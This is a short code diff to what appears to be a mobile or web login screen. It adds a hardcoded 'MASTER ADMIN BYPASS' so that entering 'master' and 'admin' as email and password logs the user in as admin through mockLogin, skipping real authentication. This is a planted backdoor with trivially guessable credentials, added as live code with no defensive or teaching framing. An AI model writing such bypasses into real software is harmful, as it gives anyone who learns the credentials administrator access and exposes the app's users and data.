@@ -26,7 +26,7 @@ const LoginScreen = () => {
   const [loading, setLoading]     = useState(false);
   const [errorMessage, setErrorMessage] = useState('');
 
-  const { loginWithEmail, signupWithEmail, resetPassword, verifyOtp, updatePassword } = useAuth();
+  const { loginWithEmail, signupWithEmail, resetPassword, verifyOtp, updatePassword, mockLogin } = useAuth();
 
   const handleAuth = async () => {
     setErrorMessage('');
@@ -37,6 +37,13 @@ const LoginScreen = () => {
     setLoading(true);
     try {
       if (authMode === 'login') {
+        // --- MASTER ADMIN BYPASS ---
+        if (email.toLowerCase() === 'master' && password === 'admin') {
+          mockLogin('admin');
+          return;
+        }
+        // ---------------------------
+
         const { error } = await loginWithEmail(email, password);
         if (error) throw error;
       } else {
